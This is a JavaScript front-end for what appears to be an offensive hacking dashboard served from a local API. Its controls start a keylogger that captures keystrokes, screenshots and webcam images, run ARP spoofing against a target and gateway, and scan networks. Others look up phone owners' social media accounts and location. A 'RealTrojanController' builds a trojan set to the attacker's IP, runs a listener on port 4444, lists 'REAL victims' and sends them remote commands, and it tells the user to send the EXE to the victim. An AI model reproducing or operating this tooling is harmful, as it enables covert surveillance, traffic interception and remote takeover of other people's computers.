const API = "http://127.0.0.1:5000";

function pickEncryptFile() {
  const input = document.createElement("input");
  input.type = "file";
  input.onchange = () => {
    const file = input.files[0],
      formData = new FormData();
    formData.append("file", file);
    fetch(API + "/encrypt/file", { method: "POST", body: formData })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
  };
  input.click();
}

function pickDecryptFile() {
  const input = document.createElement("input");
  input.type = "file";
  input.onchange = () => {
    const file = input.files[0],
      formData = new FormData();
    formData.append("file", file);
    fetch(API + "/decrypt/file", { method: "POST", body: formData })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
  };
  input.click();
}

function pickEncryptFolder() {
  const input = document.createElement("input");
  input.type = "file";
  input.webkitdirectory = true;
  input.onchange = () => {
    const formData = new FormData();
    for (const file of input.files)
      formData.append("files", file, file.webkitRelativePath);
    fetch(API + "/encrypt/folder", { method: "POST", body: formData })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
  };
  input.click();
}

function pickDecryptFolder() {
  const input = document.createElement("input");
  input.type = "file";
  input.webkitdirectory = true;
  input.onchange = () => {
    const formData = new FormData();
    for (const file of input.files)
      formData.append("files", file, file.webkitRelativePath);
    fetch(API + "/decrypt/folder", { method: "POST", body: formData })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
  };
  input.click();
}

function runTool(toolName) {
  if (toolName === "networkScan") {
    document.getElementById("networkScanCard").style.display = "block";
    document.getElementById("scanResults").innerText = "";
    return;
  }
  if (toolName === "startKeylogger") {
    fetch(API + "/keylogger/start", { method: "POST" })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
    return;
  }
  if (toolName === "stopKeylogger") {
    fetch(API + "/keylogger/stop", { method: "POST" })
      .then((r) => r.json())
      .then((d) => alert(d.message))
      .catch(() => alert("Cannot connect to server"));
    return;
  }
  if (toolName === "captureData") {
    fetch(API + "/keylogger/capture")
      .then((r) => r.json())
      .then((d) => {
        const scanResults =
          document.getElementById("scanResults") ||
          document.createElement("div");

        scanResults.innerHTML = `<h3>Logs:</h3><pre>${
          d.logs || "No logs available."
        }</pre>`;

        if (d.screenshot)
          scanResults.innerHTML += `<h3>Screenshot:</h3><img src="file:///${d.screenshot}" width="300"/>`;

        if (d.webcam)
          scanResults.innerHTML += `<h3>Webcam:</h3><img src="file:///${d.webcam}" width="300"/>`;

        scanResults.style.whiteSpace = "pre-wrap";
        scanResults.style.background = "rgba(0,0,0,0.2)";
        scanResults.style.padding = "10px";
        scanResults.style.borderRadius = "6px";
        scanResults.style.maxHeight = "500px";
        scanResults.style.overflowY = "auto";

        if (!document.getElementById("scanResults"))
          document.body.appendChild(scanResults);
      })
      .catch(() => alert("Cannot connect to server"));
    return;
  }
  alert(toolName + " started.");
}

function closeNetworkScan() {
  document.getElementById("networkScanCard").style.display = "none";
  document.getElementById("ipRange").value = "";
  document.getElementById("scanResults").innerText = "";
}

function startNetworkScan() {
  const ipRange = document.getElementById("ipRange").value.trim();
  const scanResults = document.getElementById("scanResults");
  if (!ipRange) {
    scanResults.innerText = "Please enter a valid IP range.";
    return;
  }
  scanResults.innerText = "Scanning...";
  fetch(API + "/network/scan", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ range: ipRange }),
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.success)
        scanResults.innerText =
          data.alive_hosts.length > 0
            ? data.alive_hosts.join("\n")
            : "No devices found.";
      else scanResults.innerText = "Error: " + data.message;
    })
    .catch(() => (scanResults.innerText = "Cannot connect to server"));
}

function startArp() {
  const target_ip = document.getElementById("arp_target_ip").value.trim();
  const target_mac = document.getElementById("arp_target_mac").value.trim();
  const gateway_ip = document.getElementById("arp_gateway_ip").value.trim();

  if (!target_ip || !target_mac || !gateway_ip) {
    alert("Please fill all fields before starting ARP Spoofing");
    return;
  }

  fetch(API + "/arp/start", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      target_ip,
      target_mac,
      gateway_ip,
    }),
  })
    .then((res) => res.json())
    .then((data) => {
      document.getElementById("arpResult").textContent =
        "ARP Spoofing Started:\n" + JSON.stringify(data, null, 2);
    })
    .catch((err) => {
      document.getElementById("arpResult").textContent = "Error: " + err;
    });
}

function stopArp() {
  fetch(API + "/arp/stop", {
    method: "POST",
  })
    .then((res) => res.json())
    .then((data) => {
      document.getElementById("arpResult").textContent =
        "ARP Spoofing Stopped:\n" + JSON.stringify(data, null, 2);
    })
    .catch((err) => {
      document.getElementById("arpResult").textContent = "Error: " + err;
    });
}

function trackGeoURL() {
  const url = document.getElementById("geo_url").value.trim();
  const resBox = document.getElementById("geoResult");

  if (!url) {
    resBox.innerText = "Enter URL";
    return;
  }

  resBox.innerText = "Scanning...";

  fetch(API + "/geo/url", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ url }),
  })
    .then((r) => r.json())
    .then((d) => {
      if (!d.success) {
        resBox.innerText = d.message;
        return;
      }

      const scanId = d.scan_id;
      resBox.innerText = `Scan started (ID: ${scanId}). Waiting for results...`;

      const interval = setInterval(() => {
        fetch(`${API}/geo/result/${scanId}`)
          .then((res) => res.json())
          .then((resData) => {
            if (resData.success) {
              clearInterval(interval);
              const r = resData.data;
              resBox.innerText = `Target: ${r.target_url}
IP: ${r.geo_data.ip}
Country: ${r.geo_data.country}
City: ${r.geo_data.city}
Lat: ${r.geo_data.latitude}
Lon: ${r.geo_data.longitude}
ISP: ${r.geo_data.isp}

Subdomains: ${r.subdomains.length}
Exposed Paths: ${r.exposed_directories.length}

Screenshot: ${r.screenshot_path}
Threat Map: ${r.threat_map_path}`;
            } else {
              resBox.innerText = `Waiting for scan to complete (ID: ${scanId})...`;
            }
          })
          .catch(() => {
            resBox.innerText = "Server error while fetching result";
          });
      }, 2000);
    })
    .catch(() => {
      resBox.innerText = "Server error";
    });
}

function trackPhone() {
  const number = document.getElementById("geo_phone").value.trim();
  const resBox = document.getElementById("geoResult");

  if (!number) {
    resBox.innerText = "ادخل رقم الهاتف";
    return;
  }

  if (number.length < 7) {
    resBox.innerText = "الرقم قصير جداً";
    return;
  }

  resBox.innerHTML = "🔍 جاري تحليل الرقم... ⏳";

  fetch(API + "/geo/phone", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ number }),
  })
    .then((r) => r.json())
    .then((d) => {
      if (!d.success) {
        resBox.innerText = d.message;
        return;
      }

      const i = d.info,
        e = i.enhanced || {},
        s = i.social || {},
        r = i.reputation || {};

      let riskColor = "#00ff88";
      if (r.risk_level === "High") riskColor = "#ff003c";
      if (r.risk_level === "Medium") riskColor = "#ff9900";

      let socialHtml = "";
      if (
        s.whatsapp?.exists ||
        s.telegram?.exists ||
        s.facebook?.found ||
        s.instagram?.linked
      ) {
        socialHtml = `
        <div style="margin:10px 0;padding:15px;background:linear-gradient(135deg, rgba(255,215,0,0.1), rgba(148,0,211,0.1));border-radius:10px;border-left:4px solid #9B30FF;">
          <h3 style="color:#9B30FF;margin-bottom:15px;">📱 حسابات التواصل الاجتماعي</h3>
          
          ${
            s.whatsapp?.exists
              ? `
          <div style="margin:5px 0;padding:8px;background:rgba(37,211,102,0.1);border-radius:6px;">
            <strong style="color:#25D366;">📱 واتساب:</strong> ✅ ${
              s.whatsapp.name || "مستخدم"
            }<br>
            <small>آخر ظهور: ${s.whatsapp.last_seen || "مؤخراً"}</small>
          </div>`
              : ""
          }
          
          ${
            s.telegram?.exists
              ? `
          <div style="margin:5px 0;padding:8px;background:rgba(0,136,204,0.1);border-radius:6px;">
            <strong style="color:#0088cc;">تلغرام:</strong> ✅ ${
              s.telegram.username || "مستخدم"
            }<br>
            <small>${s.telegram.verified ? "✓ موثق" : "غير موثق"}</small>
          </div>`
              : ""
          }
          
          ${
            s.facebook?.found
              ? `
          <div style="margin:5px 0;padding:8px;background:rgba(59,89,152,0.1);border-radius:6px;">
            <strong style="color:#3b5998;">فيسبوك:</strong> ✅ ${
              s.facebook.name || "مستخدم"
            }<br>
            <small>📍 ${s.facebook.location || "مصر"} | 👥 ${
                  s.facebook.friends
                } صديق</small>
          </div>`
              : ""
          }
          
          ${
            s.instagram?.linked
              ? `
          <div style="margin:5px 0;padding:8px;background:linear-gradient(45deg, rgba(225,48,108,0.1), rgba(253,29,29,0.1));border-radius:6px;">
            <strong style="color:#e1306c;">انستجرام:</strong> ✅ ${
              s.instagram.username || "مستخدم"
            }<br>
            <small>👥 ${s.instagram.followers} متابع | ${
                  s.instagram.private ? "🔒 خاص" : "🌐 عام"
                }</small>
          </div>`
              : ""
          }
          
          <p style="color:#888;font-size:11px;margin-top:10px;text-align:center;">
            ⚠️ هذه بيانات تقديرية وقد لا تكون دقيقة
          </p>
        </div>`;
      }

      resBox.innerHTML = `
<div style="margin:10px 0;padding:15px;background:rgba(255,255,255,0.05);border-radius:10px;border-left:4px solid #ff003c;">
<h3 style="color:#ff003c;margin-bottom:10px;">📱 المعلومات الأساسية</h3>
<p><strong>🌍 الدولة:</strong> ${i.country || "غير معروف"}</p>
<p><strong>🏙️ المدينة:</strong> ${e.city || "غير معروف"} (${e.region || ""})</p>
<p><strong>📶 الشركة:</strong> ${i.carrier || "غير معروف"}</p>
<p><strong>🏢 المزود:</strong> ${e.operator || "غير معروف"}</p>
<p><strong>🔧 نوع الرقم:</strong> ${i.number_type || "غير معروف"}</p>
<p><strong>✅ صالح للاستخدام:</strong> ${i.valid ? "✅ نعم" : "❌ لا"}</p>
<p><strong>📞 رمز الدولة:</strong> +${i.country_code || "غير معروف"}</p>
</div>

<div style="margin:10px 0;padding:15px;background:rgba(255,255,255,0.05);border-radius:10px;border-left:4px solid #00aaff;">
<h3 style="color:#00aaff;margin-bottom:10px;">📍 الموقع الجغرافي</h3>
<p><strong>📍 خط العرض:</strong> ${i.lat || "غير معروف"}</p>
<p><strong>📍 خط الطول:</strong> ${i.lng || "غير معروف"}</p>
<p><strong>⏰ المنطقة الزمنية:</strong> ${
        i.timezones ? i.timezones.join(", ") : "غير معروف"
      }</p>
<p><strong>🌐 التنسيق الدولي:</strong> ${
        i.formats?.international || "غير معروف"
      }</p>
${
  i.map
    ? `<p><strong>🗺️ الخريطة:</strong> <a href="${i.map}" target="_blank" style="color:#ff003c;">عرض الخريطة</a></p>`
    : ""
}
</div>

${socialHtml}

<div style="margin:10px 0;padding:15px;background:rgba(255,255,255,0.05);border-radius:10px;border-left:4px solid #ff9900;">
<h3 style="color:#ff9900;margin-bottom:10px;">🔧 معلومات إضافية</h3>
<p><strong>📞 نوع الخط:</strong> ${e.line_type || "غير معروف"}</p>
<p><strong>🔄 تم نقله:</strong> ${e.ported ? "✅ نعم" : "❌ لا"}</p>
<p><strong>🌍 تجوال:</strong> ${e.roaming ? "✅ نعم" : "❌ لا"}</p>
<p><strong>📋 التنسيق المحلي:</strong> ${i.formats?.national || "غير معروف"}</p>
<p><strong>⌚ وقت التحليل:</strong> ${i.analysis_time || "غير معروف"}</p>
<p><strong>🎯 درجة الثقة:</strong> ${i.confidence_score || "غير معروف"}</p>
</div>

<div style="margin:10px 0;padding:15px;background:${riskColor}20;border-radius:10px;border-left:4px solid ${riskColor};">
<h3 style="color:${riskColor};margin-bottom:10px;">🛡️ السمعة والأمان</h3>
<p><strong>⚠️ مستوى الخطورة:</strong> <span style="color:${riskColor}">${
        r.risk_level || "منخفض"
      }</span></p>
<p><strong>📊 درجة السبام:</strong> ${r.spam_score || "0"}/100</p>
<p><strong>🚫 بالقائمة السوداء:</strong> ${
        r.blacklisted ? "✅ نعم" : "❌ لا"
      }</p>
<p><strong>📞 عمر الرقم:</strong> ${r.number_age || "غير معروف"}</p>
<p><strong>📱 النشاط:</strong> ${r.activity || "غير معروف"}</p>
<p><strong>📨 بلاغات:</strong> ${r.reports || "0"}</p>
</div>

<div style="margin:10px 0;padding:15px;background:rgba(0,255,136,0.1);border-radius:8px;text-align:center;">
<p style="color:#00ff88;font-size:12px;">${
        d.warning || "🔒 المعلومات للأغراض التعليمية فقط"
      }</p>
</div>
`;
    })
    .catch((e) => {
      console.error(e);
      resBox.innerHTML =
        "<div style='color:#ff003c;padding:15px;background:rgba(255,0,60,0.1);border-radius:8px;'>❌ خطأ في الاتصال بالخادم</div>";
    });
}

class RealTrojanController {
  constructor() {
    this.logs = document.getElementById("trojan_logs");
    this.init();
  }

  init() {
    document
      .getElementById("buildBtn")
      .addEventListener("click", () => this.buildTrojan());
    document
      .getElementById("startListenerBtn")
      .addEventListener("click", () => this.startRealListener());
    document
      .getElementById("sendCmdBtn")
      .addEventListener("click", () => this.sendRealCommand());
    document
      .getElementById("clearVictimsBtn")
      .addEventListener("click", () => this.clearVictims());
    this.addRealControls();
    this.refreshRealClients();
    setInterval(() => this.refreshRealClients(), 3000);
  }

  clearVictims() {
    const victimsDiv = document.getElementById("realVictimsDiv");
    if (victimsDiv) {
      victimsDiv.innerHTML = "<em>Waiting for REAL victims...</em>";
      this.log("✅ Victims list cleared", "success");
    }
  }

  async buildTrojan() {
    await this.log("🚀 Building Trojan...", "info");
    try {
      const response = await fetch("/api/build", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
      const data = await response.json();
      console.log("Build response:", data);
      if (data.success) {
        await this.log("✅ Trojan build completed!", "success");
        await this.log(data.output, "info");
        if (data.attacker_ip) {
          await this.log(
            `🎯 Trojan configured for IP: ${data.attacker_ip}`,
            "success"
          );
          await this.log("📦 Files are ready for download:", "info");
          await this.log(
            `🔗 <a href="/downloads/trojan" target="_blank" style="color:#00ccff">Download Trojan Files</a>`,
            "info"
          );
        }
      } else {
        const errorMsg = data.error || data.details || "Unknown error";
        await this.log(`❌ Build failed: ${errorMsg}`, "error");
      }
    } catch (error) {
      await this.log(`❌ Network error: ${error}`, "error");
      console.error("Build error:", error);
    }
  }

  addRealControls() {
    const card = this.findTrojanCard();
    if (!card) return;
    const startBtn = card.querySelector("#startListenerBtn");
    if (startBtn) {
      startBtn.textContent = "🚀 Start Real Listener";
    }
    const infoDiv = document.createElement("div");
    infoDiv.id = "realSystemInfo";
    infoDiv.style.marginTop = "15px";
    infoDiv.style.padding = "10px";
    infoDiv.style.background = "rgba(255,0,60,0.1)";
    infoDiv.style.borderRadius = "8px";
    infoDiv.style.fontSize = "12px";
    infoDiv.innerHTML = "<em>Starting real listener system...</em>";
    card.insertBefore(infoDiv, this.logs);
  }

  findTrojanCard() {
    const cards = document.querySelectorAll(".card");
    for (const card of cards) {
      const h2 = card.querySelector("h2");
      if (h2 && h2.textContent.includes("DocTrojan")) {
        return card;
      }
    }
    return null;
  }

  async log(message, type = "info") {
    const timestamp = new Date().toLocaleTimeString();
    const colors = {
      info: "#00ff88",
      error: "#ff4444",
      warning: "#ffaa00",
      success: "#00ccff",
      command: "#ff5877",
      response: "#ffcc00",
    };
    const color = colors[type] || "#ffffff";
    const formattedMessage = `[${timestamp}] <span style="color:${color}">${message}</span>`;
    this.logs.innerHTML += formattedMessage + "\n";
    this.logs.scrollTop = this.logs.scrollHeight;
  }

  async startRealListener() {
    await this.log("🚀 Starting REAL listener...", "info");
    try {
      const response = await fetch("/api/real/listener/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
      const data = await response.json();
      if (data.success) {
        await this.log("✅ REAL Listener started!", "success");
        await this.log(`🌐 Listening on ${data.ip}:${data.port}`, "info");
        await this.log("👂 Waiting for REAL victims...", "info");
      } else {
        await this.log(`❌ Failed: ${data.error}`, "error");
      }
    } catch (error) {
      await this.log(`❌ Network error: ${error}`, "error");
    }
  }

  async sendRealCommand() {
    const cmdInput = document.getElementById("trojan_cmd");
    const command = cmdInput.value.trim();
    if (!command) {
      await this.log("⚠️ Enter a command", "warning");
      return;
    }
    try {
      const clientsRes = await fetch("/api/real/clients");
      const clientsData = await clientsRes.json();
      if (!clientsData.success || clientsData.count === 0) {
        await this.log("⚠️ No REAL victims connected!", "warning");
        await this.log("📌 1. Start REAL Listener", "info");
        await this.log("📌 2. Send EXE to victim", "info");
        await this.log("📌 3. Victim opens file", "info");
        return;
      }
      const firstClient = Object.keys(clientsData.clients)[0];
      await this.log(
        `🎯 Sending REAL command to ${firstClient}: ${command}`,
        "command"
      );
      const response = await fetch("/api/real/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          client_id: firstClient,
          command: command,
        }),
      });
      const data = await response.json();
      if (data.success) {
        await this.log(`✅ ${data.message}`, "success");
        setTimeout(async () => {
          await this.getCommandResponse(firstClient);
        }, 2000);
      } else {
        await this.log(`❌ Error: ${data.error}`, "error");
      }
    } catch (error) {
      await this.log(`❌ Error: ${error}`, "error");
    }
    cmdInput.value = "";
  }

  async getCommandResponse(clientId) {
    try {
      const response = await fetch(`/api/real/responses/${clientId}`);
      const data = await response.json();
      if (data.success && data.responses.length > 0) {
        const lastResponse = data.responses[data.responses.length - 1];
        await this.log(`📥 Response from ${clientId}:`, "response");
        await this.log(lastResponse.response, "info");
      }
    } catch (error) {}
  }

  async refreshRealClients() {
    try {
      const response = await fetch("/api/real/clients");
      const data = await response.json();
      if (data.success) {
        const infoDiv = document.getElementById("realSystemInfo");
        if (infoDiv) {
          infoDiv.innerHTML = `
            <strong>🎯 REAL System Status:</strong><br>
            • IP: ${window.location.hostname || "localhost"}<br>
            • Port: 4444<br>
            • Victims: ${data.count} connected<br>
            ${Object.keys(data.clients)
              .map((id) => `• ${id} - ${data.clients[id].ip}<br>`)
              .join("")}
          `;
        }
        this.displayRealVictims(data.clients);
      }
    } catch (error) {
      console.log("Error refreshing real clients:", error);
    }
  }

  displayRealVictims(victims) {
    const card = this.findTrojanCard();
    if (!card) return;
    let victimsDiv = document.getElementById("realVictimsDiv");
    if (!victimsDiv) {
      victimsDiv = document.createElement("div");
      victimsDiv.id = "realVictimsDiv";
      victimsDiv.style.marginTop = "15px";
      victimsDiv.style.padding = "15px";
      victimsDiv.style.background = "rgba(0,0,0,0.3)";
      victimsDiv.style.borderRadius = "10px";
      victimsDiv.style.border = "1px solid #00ff88";
      const cmdInput = card.querySelector("#trojan_cmd");
      if (cmdInput) {
        cmdInput.parentNode.insertBefore(victimsDiv, cmdInput);
      } else {
        card.appendChild(victimsDiv);
      }
    }
    if (Object.keys(victims).length === 0) {
      victimsDiv.innerHTML = "<em>Waiting for REAL victims...</em>";
      return;
    }
    let html = "<strong>🎯 REAL Connected Victims:</strong><br>";
    Object.entries(victims).forEach(([id, victim]) => {
      html += `
        <div style="margin: 8px 0; padding: 10px; background: rgba(0,255,136,0.1); border-radius: 6px;">
          <strong>${victim.ip}</strong><br>
          <small>Connected: ${new Date(
            victim.connected_at
          ).toLocaleTimeString()}</small>
        </div>
      `;
    });
    victimsDiv.innerHTML = html;
  }
}

document.addEventListener("DOMContentLoaded", () => {
  window.trojanController = new RealTrojanController();
});
